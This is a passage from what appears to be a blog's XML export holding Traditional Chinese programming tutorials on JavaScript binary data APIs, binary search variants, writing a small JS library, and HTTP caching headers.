const buffer = new ArrayBuffer(6)new Uint16Array(buffer, 1)// RangeError: start offset of Uint16Array should be a multiple of 2new Uint32Array(buffer, 0)// RangeError: byte length of Uint32Array should be a multiple of 4

所以囉，當我們在設計複合資料時，想想對應的 C struct alignment，多考量記憶體底層，才不會讓操作 binary data 產生效能低落的反效果。
Others最後，讓我們來認識除了 Typed Array 家族以外，JavaScript 的生態圈其他與記憶體息息相關的成員吧！
Node.js Buffer早在 ES6 引入 TypedArray 之前，Node.js 為了處理 binary data，就實作 Buffer class，也針對 V8 引擎做最佳化。Buffer 在 Node.js 的環境中是 Global object，其功能可視為 ArrayBuffer + TypedArray + DataView 的複合體，甚至可以配置 non-zero-filled 的 unsafe buffer，好危險啊。
在使用上，Buffer 可從 ArrayBuffer 建構，也可從自身建構 TypedArray。事實上，Node.js v3+ 之後，Buffer 就繼承自 Uint8Array 了，不過有些 memory share／copy 的實作與 spec 有出入，在與 TypedArray ArrayBuffer 轉換時，需注意這些小細節。
Web API BlobBlob 是一個不可變（immutable）的 raw binary sequence，只有兩個 attribute 和一個 method。

size：blob 實例的 byte 大小。
type：blob 實例的 MIME type。
slice：切割一部分的 blob 實例，返回新的 blob。

Blob 的 spec 寫在 W3C File API draft 中，為 File class 的父類別。主要目的是提供可代表與儲存 JavaScript native 以外的格式，例如以 blob 儲存 死肥宅.jpg。Blob 除了可以從 object 建構，也可傳入 TypedArray 或 DOMString 建構。此外，File API，Fetch API、XMLHttpRequest v2 也都可以將 Request／Response 的 body 轉換成 Blob，非常泛用途呢！
而 Blob 最強大的地方就是配合 URL.createObjectURL 生成一個 Blob URL。如同你我認知中的 URL，任何運用 URL 之處，都可以傳入 Blob URL，比起 Image、ImageData、MediaSource，URL 接受與使用度肯定更為廣闊，這讓資料處理，物件傳遞的耦合性變得更低。
當我們建立 Blob URL 後，若可預期的未來內不需要用到該 URL，就使用 URL.revokeObjectURL 取消註冊，否則該 URL 指向的 Blob 會持續留存，佔用你的儲存空間，直到瀏覽器執行 unload document cleanup 的步驟（如關閉分頁），才會將所有 Blob URL 清除。所以說，如需管理 Blob URL，還是老老實實把這些 URL 記錄起來吧！
Wrap-up藉由這些直接操作 binary data 的 API，現代的 JavaScript 環境的效能提升到另一個層次，若再配合 Web worker  Service worker 等多線程技術，加上線程共享的 ShareArrayBuffer 與 Atomic API，高效能的 web app 指日可待。如果再加上逐漸普及，即將成為 Webpack 一等公民 的 WebAssembly，JavaScript／Web 的世界更是不可限量啊！或許，使用 Rust 寫網頁的世代即將來臨 XD。
前端工程師們，活到老，學到掛吧！
Reference
MDN: ArrayBuffer
MDN: TypedArray
W3C: File API - Blob
Wiki: Data structure alignment
Wiki: Endianness
Wiki: Integer overflow
HTML5 Rocks: Typed Arrays
Node.js: Buffer
OPass：關於記憶體對齊(Alignment) 
阮一峰：ECMAScript 6 入门

關於作者：@weihanglo 掛著 iOS 工程師之名，行開發 Web App 之實。
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Endianness</tag>
        <tag>Binary Data</tag>
        <tag>Memory Alignment</tag>
      </tags>
  </entry>
  <entry>
    <title>淺談二分搜尋法</title>
    <url>/2016/09/24/binary-search-introduction/</url>
    <content><![CDATA[前言在寫程式的時候，其實會滿常用到「搜尋」的功能。最簡單的搜尋就是在一串數字裡面找出你想要的數字，而這也是我們今天的主題。  
這一篇大致上會分成三個部分，第一部分會先介紹線性搜尋法，第二部分介紹二分搜尋法，最後一部分談談二分搜尋法在不同條件底下的實作方式會有什麼不同。
線性搜尋法為了由淺入深，我們從最基礎的線性搜尋法（Linear search）開始談起。就如同它的名字一樣，線性搜尋法就是「從頭到尾一個一個找」，時間複雜度為 O(n)，很容易理解也很好實作  
function linear_search(array, target)&#123;  for(var i=0; i&lt;array.length; i++)&#123;    if(array[i]==target) return i;  &#125;  return -1; //找不到&#125;

或是可以參考這個簡單的動畫，錄自Algorithm Visualizations
二分搜尋法假如今天要搜尋的數列是有序的，我們便可以把線性搜尋法再做優化，使時間複雜度再更低一點  
二分搜尋法的原理跟小時候大家玩「終極密碼」的流程十分類似就是那個 1~99 要你猜數字的遊戲  
為了快點猜到（或是讓敵人快點猜到），有些人第一個數字會喊 50，為什麼呢？因為無論數字是小於或是大於 50，剩下的數字一定會砍一半，變成原本的 1&#x2F;2假設下一次也繼續這樣砍對半，大概猜個七八次，就能「保證」一定猜得到  
這邊可以做個簡單的小驗證：如果只有 1 個數字，猜 1 次必定猜得到如果只有 2 個數字，猜 2 次必定猜得到如果只有 3 個數字，猜 2 次必定猜得到如果只有 4 個數字，假設是 1 2 3 4 好了切半猜 2，結果範圍變成 3 4，剩兩個數字，要猜 2 次所以 4 個數字的話，猜 1 + 2 &#x3D; 3 次一定猜得到  
如果有 8 個數字，切半剩下 4 個，所以要猜 1 + 3 &#x3D; 4 次…這樣繼續推廣下去，就會發現保證能猜到的次數與以 2 為底取 log 有關詳細數學公式就不再贅述  
瞭解原理之後，會發現二分搜尋法的流程也非常簡單：

決定好左邊界 L，右邊界 R
取 M &#x3D; (L+R)&#x2F;2，作為中間的 index
如果 array[M] &#x3D;&#x3D; 要找的數，return M
如果 array[M]&gt;要找的數，表示 M~R 這一段數字都是不可能的，所以讓 R &#x3D; M - 1
如果 array[M]&lt;要找的數，表示 L~M 這一段數字都是不可能的，所以讓 L &#x3D; M + 1
如果 R&gt;&#x3D;L，持續第 2 步，否則回傳 -1（代表找不到）

這邊的停止條件是「當L&gt;R」的時候，就代表找不到了因為 L 代表：最左邊的有可能的值。換句話說，假如有答案，一定在 &gt;&#x3D;L 的位置R 代表的是：最右邊有可能的值，假如有答案，一定在 &lt;&#x3D;R 的位置所以當L &gt; R 的時候，&gt;&#x3D;L 跟 &lt;&#x3D;R 已經是空集合了，代表不可能有答案  
這邊還有一個要特別注意的點是(L+R)/2這句，當值很大的時候可能會造成 overflow。為了避免這種情形，可以改寫成(R-L)/2 + L  
可以參考一樣從 Algorithm Visualizations 錄製的簡單動畫
（藍色是 L，黃色是 R，綠色是 M，要找的數字是 180）
function binary_search(array, target) &#123;  var L = 0, R = array.length - 1;  while(L&lt;=R) &#123;    var M = Math.floor((L+R)/2);    if(array[M]==target)&#123;      return M;    &#125; else if(array[M]&gt;target) &#123;      R = M - 1;    &#125; else &#123;      L = M + 1;    &#125;  &#125;  return -1;&#125;

不同條件的二分搜尋法剛剛所介紹的二分搜尋法，就只是要求在一連串數列裡面回答說有沒有找到，有的話在第幾個位置有如果數列裡有重複的數字，而且條件變更成：回傳「第一個」出現的位置例如說 1 2 2 2 2 2 3 3 要找 2，就回傳：1，因為第一個 2 出現在 index 為 1 的地方  
或者，改成回傳「最後一個」出現的位置同樣以上面那個例子來說，要回傳：5，因為 index 5 是最後一個 2  
甚至還有稍微更複雜一點的，例如說以下四種：

回傳第一個 &gt;&#x3D;target 的位置
回傳第一個 &gt;target 的位置
回傳最後一個 &lt;&#x3D;target 的位置
回傳最後一個 &lt;target 的位置

（可參考：lower_bound）再搭配上剛剛所說的找等於 target 的第一個與最後一個的位置可以知道這樣的變形總共有 6 種，那該怎麼辦呢？  
其實原理都很類似，一樣是用二分搜尋去排除最多的數字，但是在一些條件判斷上會有些微差異如果弄得不好的話，很容易會造成無窮迴圈，例如說找最後一個小於target 的數：  
function search(array, target)&#123;  var L = 0, R = array.length - 1;  while(L&lt;=R) &#123;    var M = Math.floor((L+R)/2);    if(array[M]&lt;target)&#123;      L = M;    &#125; else &#123;      R = M - 1;    &#125;  &#125;  return M;&#125;

我們拿這一組範例去跑：search([1,2,3,4,5],2)剛開始 L&#x3D;0, R&#x3D;4, M&#x3D;2array[2] &#x3D; 3 &gt; 2，所以 R &#x3D; 2-1 &#x3D; 1  
接著 L&#x3D;0, R &#x3D; 1, M &#x3D; 0array[0] &#x3D; 1 &lt; target，L &#x3D; M &#x3D; 0  
然後就會再重複一樣的步驟，陷入無窮迴圈這個就是寫二分搜的時候最常碰到的情況之一一些條件沒有設定好，或許只是差一個等號或者是+1 -1，但就是搞不定  
網路上可以找到許多文章，都是在講解應該要怎麼設定這些條件：  

二分查找法的实现和应用汇总
漫谈二分查找-Binary Search 
二分搜索法简单分析与总结

或是這篇知乎上的問答也有很多討論可以參考：二分查找有几种写法？它们的区别是什么？其中我最喜歡的是這個回答：  

说到面试，其实这题的难点在于最后边界条件，那么我们根本不用判断那个边界，二分到区间小到一定程度，比如5个元素以下，就顺序查找好了，反正也是O(lgN)的，而且最后5个元素顺序查找平均也只需要比较两三次而已，跟你二分差不多，我本人也很推荐在实际工程中这样写，可以规避很多麻烦的bug，用最稳妥的办法解决问题

這個思路我之前也有想過既然+-1或者要不要加等號這麼麻煩，那乾脆就不要加了吧！
只要把終止條件改一下，判斷邏輯也改一下就好一樣舉上面那個：找最後一個小於target 的數為例子  
基本上的原則就是：  

保證答案一定在閉區間 [L, R] 裡面
當這區間剩下的數很少時，改用線性搜尋

這樣就不用怕碰到無窮迴圈的問題了，下面附上程式碼：  
// 傳回最後一個 &lt; target 的數function lower_bound(array, target) &#123;    // 先看看是否沒答案  // 如果第一個數還是沒有 &lt; target，代表沒答案  if(array[0]&gt;=target) return -1;    // 結束條件是區間內剩兩個以下數字的時候  var L = 0, R = array.length-1;  while((R-L+1)&gt;2) &#123;    var M = Math.floor((L+R)/2);    if(array[M]&lt;target)&#123;      L = M;    &#125; else &#123;      R = M - 1;    &#125;  &#125;    // 在答案範圍內用線性搜尋  // 其實到這邊只會剩下兩個元素以內，不一定要用迴圈  for(var i=R; i&gt;=L; i--)&#123;    if(array[i]&lt;target)&#123;      return i;    &#125;  &#125; &#125;

就算條件變得不一樣，例如說要找：&gt;=target, &lt;target 等等的，只要改一下條件，用差不多的架構就可以得到解答
結論其實原本我是想好好研究一下在不同狀況下的二分搜，那些條件到底要怎麼訂，有沒有什麼統一的規則可以參考但最後覺得還是文末給出的解法最方便，不但好想，而且還好寫不用去顧慮那些&lt;&gt;&#x3D;的符號跟+1-1的問題，在執行效率上也差不多  
在演算法這一塊我沒有很專業若是文章之中有哪部分有錯的話，還麻煩各位前輩不吝指正 &lt;(_ _)&gt;  
最後附上不嚴謹的測試與各種二分搜版本的 JavaScript 程式碼  
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>search</tag>
        <tag>binary_search</tag>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>[筆記] JavaScript: Understanding the Weird Parts - Build your own lib/framework</title>
    <url>/2018/05/05/build-own-js-lib/</url>
    <content><![CDATA[之前趁著 Udemy 特價，買了上面很有名的課程 - JavaScript: Understanding the Weird Parts，當初會想買是因為他最後面有個章節是介紹如何建構自己的 JS Framework，而我一直都很想有系統性地去瞭解建構一個可供大家使用的 JS library 或是 framework 需要注意哪些事項，該怎麼寫才是安全有彈性的結構。
後來大約花了三天的時間斷斷續續把課程上完，這邊紀錄一下該章節的一些筆記，並實做一個小小的 js library 當範例。
Goal目標是建構一個 js library，可以將數字做一些簡化約分，像是我在 Web Component 實戰 中所實作的 function。並讓 user 透過 &lt;script src=&quot;formatNum.js&quot; /&gt; 的方式就能載入使用。
完整的 code 在下面這個 jsbin 中：
JS Bin on jsbin.com
可以試著在 console 中輸入以下指令來看看結果：var f = F$(&#39;1E9&#39;);f.format().log();f.format(&#39;scientific&#39;).log()
Structuring Safe Code要建構一個安全的 JS lib，勢必需要保護好自己的 scope 不受外部影響，也不會去影響外部。要做到這件事最簡單的方式就是使用一個 IIFE (Immediately Invoked Function Expression)，
;(function(global) &#123;        &#125;(window));

而我們需要將 lib 能夠 export 到外部供人使用，所以在這個立即執行函式中需要傳入 window 物件，在函式內我們則取名為 global，這樣未來如果想要執行在不同環境，像是 nodejs 裡面時，可以不用更改內部的變數名稱，只要修改傳入的 window 變數即可。
另外最前方可以加上個分號，以免有其他人的 code 沒有用分號做結尾而造成問題，不過這個並不是必須的。
在這個立即執行函式中的變數除非我們刻意 export 出去，否則都只存在於自己的作用域內，是個安全的結構。
下方的 supportedUnit 與 unit 在外部都無法存取，無法透過 FormaNum.unit 取得。
;(function(global) &#123;     // hidden within the scope of the IIFE and never directly accessible    const supportedUnit = [&#x27;normal&#x27;, &#x27;scientific&#x27;];        const unit = &#123;        normalUnit: [          &#123; value: 1000000000,  symbol: &quot;B&quot; &#125;,          &#123; value: 1000000,  symbol: &quot;M&quot; &#125;,          &#123; value: 1000,  symbol: &quot;k&quot; &#125;        ],        siUnit: [          &#123; value: 1E18, symbol: &quot;E&quot; &#125;,          &#123; value: 1E15, symbol: &quot;P&quot; &#125;,          &#123; value: 1E12, symbol: &quot;T&quot; &#125;,          &#123; value: 1E9,  symbol: &quot;G&quot; &#125;,          &#123; value: 1E6,  symbol: &quot;M&quot; &#125;,          &#123; value: 1E3,  symbol: &quot;k&quot; &#125;        ],    &#125;    // ...    &#125;(window));

Object, Prototype and Properties接著就是開始實作我們的 lib 內容了，這門課程中，有帶著我們了解 JQuery 的 source code，看看這個偉大的 lib 是如何架構其內部程式，其中很特別的地方在於它 new 一個物件的方式，通常我們載入一個別人寫好的物件，或是我們自己寫好了一個物件，要使用的時候會需要透過 const objectInstanc = new Object() 的方式來產生物件實例，但為何我們使用 JQuery 的時候都不需要特別使用 new 關鍵字呢？
因為在 JQuery 中，他透過下面的方式來幫你在每次使用它時自動 new 了一個物件：
// &#x27;new&#x27; an objectconst FormatNum = function(num, digits, unit) &#123;    return new FormatNum.init(num, digits, unit);   &#125;//...// the actual object is created here, allowing us to &#x27;new&#x27; an object without calling &#x27;new&#x27;FormatNum.init = function(num, digits, unit) &#123;        const self = this;    self.num = num || &#x27;&#x27;;    self.digits = digits || &#x27;&#x27;;    self.unit = unit || &#x27;normal&#x27;;        self.validate();    &#125;;

這時候你可能會想說，這樣的寫法，不就代表我要加 method 到 prototype 的話，都是要加在 FormatNum.init.prototype 了嗎？ 這樣有點奇怪耶，畢竟我的 lib 是叫做 FormatNum呀！
沒錯，所以我們可以將 FormatNum.init.prototype 在指定到 FormatNum.prototype 上：
FormatNum.init.prototype = FormatNum.prototype;

透過短短這兩個步驟，我們就能夠不需要自己 new object，同時又能直接在 FormatNum 上面設置 prototype method！
另外，透過在每個 method 的最後 return this，就能讓我們的 function chainable。
// prototype holds methods (to save memory space)    FormatNum.prototype = &#123;                validate: function() &#123;            ///        &#125;,              calculate: function(unitType) &#123;          ///        &#125;,              formatScientific: function() &#123;          return this.calculate(&#x27;siUnit&#x27;);        &#125;,                formatNormal: function() &#123;          return this.calculate(&#x27;normalUnit&#x27;);        &#125;,        // chainable methods return their own containing object        format: function(unit) &#123;            let formattedNum;                        // if undefined or null it will be coerced to &#x27;false&#x27;            if (unit === &#x27;scientific&#x27;) &#123;                formattedNum = this.formatScientific();              &#125;            else &#123;                formattedNum = this.formatNormal();              &#125;                      this.formattedNum = formattedNum;            // &#x27;this&#x27; refers to the calling object at execution time            // makes the method chainable            return this;        &#125;,                log: function() &#123;            if (console) &#123;                console.log(&#x27;formattedNum is: &#x27; + this.formattedNum);             &#125;        &#125;,            &#125;;

export to outside world最後我們只要加上 global.FormatNum = global.F$ = FormatNum;
就可以在外部使用 FormatNum 或是 F$ 來呼叫我們的 lib 了！
結論與小問題建造 js lib 的概念不難，只是如果很少開發的話，確實容易忘記一些眉眉角角，透過這次的文章也算是稍稍再複習了一下先前課程的內容。另外，在實作範例時，本來想直接全用 ES6 寫（課程主要都是 ES5），但是在這邊的 function 都不能用 ES6 的 arrow function 取代，this 的作用域不同，會造成問題。這篇有提到，arrow function 會 binding 到整個 module 的 scope，而非 object。所以如果是想透過 ES6 來撰寫的話，應該是需要換另一種寫法，之後找到好作法再來補上。
資料來源
JavaScript: Understanding the Weird Parts

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>循序漸進理解 HTTP Cache 機制</title>
    <url>/2017/06/17/cache-introduction/</url>
    <content><![CDATA[前言前陣子在研究跟 HTTP Cache 有關的一些東西，看得眼花撩亂，不同的 Header 愈看愈混亂，像是Pragma, Cache-Control, Etag, Last-Modified, Expires 等等。找了許多參考資料閱讀之後才有了比較深刻的理解，想說若是從一個比較不同的角度來理解 Cache，說不定會比較容易了解這些 Header 到底在做什麼。
在之前查的資料裡面，很多篇都是逐一解釋各個 Header 的作用以及參數，而我認為其實參數講多了容易造成初學者混淆，想說怎麼有這麼多奇怪的參數，而且每一個看起來都很像。所以這篇文章嘗試一步一步藉由不同的問題來引導出各個 Header 使用的場景以及出現的目的。還有，因為這篇是給初學者看的，所以不會講到所有的參數。
其實關於 Cache 這一部分，很多網路資源的說法都不太一樣，如果碰到有疑義的地方我會盡量以 RFC 上面寫的標準為主。如果有錯誤的話還麻煩不吝指正，感謝。
為什麼需要 Cache多問為什麼是個好習慣，在你用一個東西之前，必須知道你為什麼要用它。於是，我們需要問自己一個問題：為什麼需要 Cache？
很簡單，因為節省流量嘛，也節省時間，或是更宏觀地來說，減少資源的損耗。
舉例來說，今天電商網站的首頁可能會有很多商品，如果你今天每一個訪客到首頁你都去資料庫重新抓一次所有的資料，那對資料庫的負擔會非常非常大。
可是呢，其實首頁的這些資訊基本上短期之內是不會變的，一個商品的價格不可能上一秒是一千元，下一秒就變成兩千元。所以這些不常變動的資料就很適合儲存起來，也就是我們說的 Cache，台灣翻譯叫做快取，中國翻譯叫做緩存。
上面這個例子可以把首頁的那些資訊在撈出來一次之後就存在某個地方，例如說 Redis，其實就是以一個簡單的 Key Value Pair 的形式存進去即可，接著只要是用到這些資訊的時候，都可以用極快的速度撈出來，而不是再到資料庫裡面重新算一次。
上面講的是 Server side 的 Cache，藉由把 Database 的資料撈出來之後存到別的地方達成。但 Server side 的 Cache 並不是我們今天的重點，有興趣的讀者們可以參考我之前寫過的：資料庫的好夥伴：Redis。
今天的重點是 Server 跟瀏覽器之間的 Cache 機制。
例如說電商網站的商品圖好了。如果沒有 Cache 的話，那首頁出現的上百張商品圖，只要網頁被瀏覽幾次，就會被下載幾次，這個流量是非常驚人的。所以我們必須讓瀏覽器可以把這些圖片給 Cache 起來。這樣只有第一次瀏覽這個網頁的時候需要重新下載，第二次瀏覽的時候，圖片就可以直接從瀏覽器的快取裡面去抓，不用再跟 Server 拿資料了。
Expires要達成上述的功能，可以在 HTTP Response Header 裡面加上一個Expires的字段，裡面就是這個 Cache 到期的時間，例如說：
Expires: Wed, 21 Oct 2017 07:28:00 GMT

瀏覽器收到這個 Response 之後就會把這個資源給快取起來，當下一次使用者再度造訪這個頁面或是要求這個圖片的資源的時候，瀏覽器會檢視「現在的時間」是否有超過這個 Expires。如果沒有超過的話，那瀏覽器「不會發送任何 Request」，而是直接從電腦裡面已經存好的 Cache 拿資料。
若是打開 Chrome dev tool，就會看到它寫著：「Status code 200 (from disk cache)」，代表這個 Request 其實沒有發出去，Response 是直接從 disk cache 裡面拿的。

可是這樣其實會碰到一個問題，因為瀏覽器檢視這個 Expires 的時間是用「電腦本身的時間」，那如果我喜歡活在未來，把電腦的時間改成 2100 年，會怎樣呢？
瀏覽器就會覺得所有的 Cache 都是過期的，就會重新發送 Request。
Cache-Control 與 max-ageExpires 其實是 HTTP 1.0 就存在的 Header，而為了解決上面 Expires 會碰到的問題，HTTP 1.1 有一個新的 header 出現了，叫做：Cache-Control。（註：Cache-Control 是 HTTP 1.1 出現的 Header，但其實不單單只是解決這個問題，還解決許多 HTTP 1.0 沒辦法處理的快取相關問題）
其中一種用法是：Cache-Control: max-age=30，就代表這個 Response 的過期時間是 30 秒。假設使用者在收到這個 Response 之後的第 10 秒重新整理，那就會出現上面那樣被瀏覽器 Cache 住的現象。
但假如使用者是過 60 秒之後才重新整理，瀏覽器就會發送新的 Request。

仔細觀察 Google Logo 檔案的 Response header，你會發現它的max-age設定成31536000秒，也就是 365 天的意思。只要你在一年之內造訪這個網站，都不會對 Google logo 這張圖片送出 Request，而是會直接使用瀏覽器已經快取住的 Response，也就是這邊寫的Status code 200 (from memory cache)。
現在就碰到一個問題了，既然Expires跟max-age都可以決定一個 Response 是否過期，那如果兩個同時出現，瀏覽器要看哪一個呢？
根據RFC2616的定義：

If a response includes both an Expires header and a max-age directive, the max-age directive overrides the Expires header, even if the Expires header is more restrictive

max-age會蓋過Expires。因此現在的快取儘管兩個都會放，但其實真正會用到的是max-age。
過期了，然後呢？上面這兩個 Header 都是在關注一個 Response 的「新鮮度(freshness)」，如果 Response 夠新鮮的話（也就是還沒超過Expire或者是在max-age規定的期限裡面），就直接從快取裡面拿資料。如果過期了、不新鮮了，就發送 Request 去跟 Server 拿新的資料。
但是這邊要特別注意一點：「過期了不代表不能用」
這是什麼意思呢？剛剛有提到說 Google 的 Logo 快取時間是一年，一年之後瀏覽器就會重新發出 Request 對吧？可是很有可能 Google 的 Logo 在一年之後也不會換，代表其實瀏覽器快取起來的圖片還是可以用的。
如果是這種情況，那 Server 就不必返回新的圖片，只要跟瀏覽器說：「你快取的圖片可以繼續用一年喔」就可以了。
Last-Modified 與 If-Modified-Since想要做到上面的功能，必須要 Server 跟 Client 兩邊互相配合才行。其中一種做法就是使用 HTTP 1.0 就有的：Last-Modified與If-Modified-Since的搭配使用。
在 Server 傳送 Response 的時候，可以多加一個Last-Modified的 Header，表示這個檔案上一次更改是什麼時候。而當快取過期，瀏覽器下次再發送 Request 的時候，就可以利用這個資訊，改用If-Modified-Since來跟 Server 指定拿取：某個時間點以後有更改的資料。
直接舉一個例子吧，假設我要求 Google 首頁的圖片檔案，收到了這樣的 Response（為了方便閱讀，日期的格式有更改過，實際上的內容不會是這樣）：
Last-Modified: 2017-01-01 13:00:00Cache-Control: max-age=31536000

瀏覽器收到之後就會把這張圖片存進快取，並且標明這個檔案的最後更新時間是：2017-01-01 13:00:00，過期時間是一年後。
如果在半年後我重新請求這張圖片，瀏覽器就會跟我說：「你不用重新請求喔，這一份檔案的過期時間是一年，現在才過了半年。你要資料是吧？我這邊就有囉！」，於是就不會發送任何 Request，而是直接從瀏覽器那邊獲得資料。
接著我在過了一年之後再請求一次這張圖片，瀏覽器就會說：「嗯嗯，我這邊的快取的確過期了，我幫你去 Server 問一下檔案從2017-01-01 13:00:00以後有沒有更新」，會發送出下面這樣的 Request：
GET /logo.pngIf-Modified-Since: 2017-01-01 13:00:00

假設檔案確實更新了，那瀏覽器就會收到一份新的檔案。如果新的檔案一樣有那些 Cache 的 Header，就一樣會快取起來，跟上面的流程都一樣。那假設檔案沒有更新呢？
假設沒有更新的話，Server 就會回一個Status code: 304 (Not Modified)，代表你可以繼續沿用快取的這份檔案。

Etag 與 If-None-Match雖然上面的這個方法看起來已經很好了，但還是有一個小問題。
上面講的是檔案有沒有被「編輯」過，但其實這個編輯時間就是你電腦上檔案的編輯時間。若是你打開檔案什麼都不做，然後存檔，這個編輯時間也會被更新。可是儘管編輯時間不一樣，檔案的內容還是一模一樣的。
比起編輯時間，若是能用「檔案內容更動與否」來當作是否要更新快取的條件，那是再好不過了。
而Etag這個 Header 就是這樣的一個東西。你可以把 Etag 想成是這份檔案內容的 hash 值（但其實不是，但原理類似就是了，總之就是一樣的內容會產生一樣的 hash，不一樣的會產生不一樣的 hash）。
在 Response 裡面 Server 會帶上這個檔案的 Etag，等快取過期之後，瀏覽器就可以拿這個 Etag 去問說檔案是不是有被更動過。
Etag跟If-None-Match也是搭配使用的一對，就像Last-Modified跟If-Modified-Since一樣。
Server 在回傳 Response 的時候帶上Etag表示這個檔案獨有的 hash，快取過期後瀏覽器發送If-None-Match詢問 Server 是否有新的資料（不符合這個Etag的資料），有的話就回傳新的，沒有的話就只要回傳 304 就好了。
流程可以參考 Google 網站上的下圖：
（圖片來源：https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/images/http-cache-control.png?hl=zh-tw）
中場休息讓我們來總結一下到目前為止學到的東西：

Expires跟Cache-Control: max-age決定這份快取的「新鮮度」，也就是什麼時候「過期」。在過期之前，瀏覽器「不會」發送出任何 Request
當快取過期之後，可以用If-Modified-Since或是If-None-Match詢問 Server 有沒有新的資源，如果有的話就回傳新的，沒有的話就回傳 Status code 304，代表快取裡面的資源還能繼續沿用。

有了這幾個 Header 之後，世界看似美好，好像所有的問題都解決了一樣。
是的，我說「好像」，代表其實還有一些問題存在。
不要快取怎麼辦？有一些頁面可能會不想要任何的快取，例如說含有一些機密資料的頁面，就不希望任何的東西被保留在 Client 端。
還記得我們一開始有提過Cache-Control這個 Header 其實解決了更多問題嗎？除了可以指定max-age以外，可以直接使用：Cache-Control: no-store，代表說：「我就是不要任何快取」。
因此每一次請求都必定會到達 Server 去要求新的資料，不會有任何資訊被快取住。
（註：HTTP 1.0 裡面有一個Pragma的 Header，使用方法只有一種，就是：Pragma: no-cache，有網路上的資料說它就是不要任何快取的意思，但根據RFC7232的說法，這個用法應該跟Cache-Control: no-cache一樣，而不是Cache-Control: no-store，這兩個的差異等等會提到）
首頁的快取策略剛剛上面提到的都是一些靜態資源例如說圖片，特性就是會有好一陣子不會變動，因此可以放心地使用max-age。
但現在我們考慮到另外一種狀況，那就是網站首頁。
網站首頁雖然也不常會變動，但我們希望只要一變動，使用者就能夠馬上看到變化。那要怎麼辦呢？設max-age嗎？也是可以，例如說Cache-Control: max-age=30，只要過 30 秒就能讓快取過期，去跟 Server 拿新的資料。
但如果我們想要更即時呢？只要一變動，使用者就能夠馬上看到變化。你可能會說：「那我們可以不要快取就好啦，每次都抓取新的頁面」。可是如果這個首頁有一個禮拜都沒有變，其實使用快取會是比較好的辦法，節省很多流量。
因此我們的目的是：「把頁面快取起來，但只要首頁一變動，就能夠立刻看到新的頁面」
這個怎麼做到呢？第一招，你可以用Cache-Control: max-age=0，這就代表說這個 Response 0 秒之後就會過期，意思是瀏覽器一接收到，就會標示為過期。這樣當使用者再次造訪頁面，就會去 Server 詢問有沒有新的資料，再搭配上Etag來使用，就可以保證只會下載到最新的 Response。
例如說第一個 Response 可能是這樣：
Cache-Control: max-age=0Etag: 1234

我重新整理一次，瀏覽器發出這樣的 Request：
If-None-Match: 1234

如果檔案沒有變動，Server 就會回傳：304 Modified，有變動的話就會回傳新的檔案並且更新Etag。如果是使用這種方式，其實就是「每一次造訪頁面都會發送一個 Request 去確認有沒有新的檔案，有的話就下載更新，沒有的話沿用快取裡的」。
除了上面這招max-age=0，其實有一個已經規範好的策略叫做：Cache-Control: no-cache。no-cache並不是「完全不使用快取的意思」，而是跟我們上面的行為一樣。每次都會發送 Request 去確認是否有新的檔案。
（註：其實這兩種還是有很細微的差別，可參考What’s the difference between Cache-Control: max-age&#x3D;0 and no-cache?）
如果要「完全不使用快取」，是Cache-Control: no-store。這邊不要搞混了。
為了怕大家搞混，我再講一次這兩個的差異：
假設 A 網站是使用Cache-Control: no-store，B 網站是使用Cache-Control: no-cache。
當每一次重新造訪同樣一個頁面的時候，無論 A 網站有沒有更新，A 網站都會傳來「整份新的檔案」，假設index.html有 100 kb 好了，造訪了十次，累積的流量就是 1000kb。
B 網站的話，我們假設前九次網站都沒有更新，一直到第十次才更新。所以前九次 Server 只會回傳 Status code 304，這個封包大小我們姑且算作 1kb 好了。第十次因為有新的檔案，會是 100kb。那十次加起來的流量就是 9 + 100 &#x3D; 109 kb
可以發現 A 跟 B 達成的效果一樣，那就是「只要網站更新，使用者就能立即看到結果」，但是 B 的流量遠低於 A，因為有善用快取策略。只要每一次 Request 都先確認網站有沒有更新即可，不用每一次都抓完整的檔案下來。
這就是no-store跟no-cache的差異，永遠不用快取跟永遠檢查快取。
最後一個問題現在 Web App 當道，許多網站都是採用 SPA 的架構搭配 Webpack 打包。前端只需要引入一個 JavaScript 的檔案，Render 就交給 JavaScript 來做就好。
這類型的網站，HTML 可能長得像這樣：
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;link rel=&#x27;stylesheet&#x27; href=&#x27;style.css&#x27;&gt;&lt;/link&gt;  &lt;script src=&#x27;script.js&#x27;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- body 為空，所有內容都交給 js 去 render --&gt;&lt;/body&gt;&lt;/html&gt;

當 JavaScript 載入之後，利用 JavaScript 把頁面渲染出來。
面對這種情境，我們就會希望這個檔案能夠跟上面的首頁檔案一樣，「只要檔案更新，使用者能夠立即看到新的結果」，因此我們可以用Cache-Control: no-cache來達成這個目標。
可是呢，還記得剛說過no-cache其實就是每一次訪問頁面，都去 Server 問說有沒有新的結果。意思就是無論如何，都會發出 Request。
有沒有可能，連 Request 都不發呢？
意思就是：「只要檔案不更新，瀏覽器就不會發 Request，直接沿用快取裡的即可。只要檔案一更新，瀏覽器就要立即抓取新的檔案」
前者其實就是我們一開始講的max-age在做的事，但max-age沒辦法做到判斷「檔案不更新」這件事情。
所以其實這個目標，沒辦法單靠上面我們介紹的這些瀏覽器的快取機制來達成，需要 Server 那邊一起配合才行。其實說穿了，就是把 Etag 的機制自己實作在檔案裡面。
什麼意思呢？我們直接來看一個範例，我們把index.html改成這樣：
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;link rel=&#x27;stylesheet&#x27; href=&#x27;style.css&#x27;&gt;&lt;/link&gt;  &lt;script src=&#x27;script-qd3j2orjoa.js&#x27;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- body 為空，所有內容都交給 js 去 render --&gt;&lt;/body&gt;&lt;/html&gt;

注意到 JavaScript 的檔名變成：script-qd3j2orjoa.js，後面其實就跟 Etag 一樣，都是代表這個檔案的 hash 值。然後我們把這個檔案的快取策略設成：Cache-Control: max-age=31536000。
這樣子這個檔案就會被快取住一年。一年之內都不會對這個 URL 發送新的 Request。
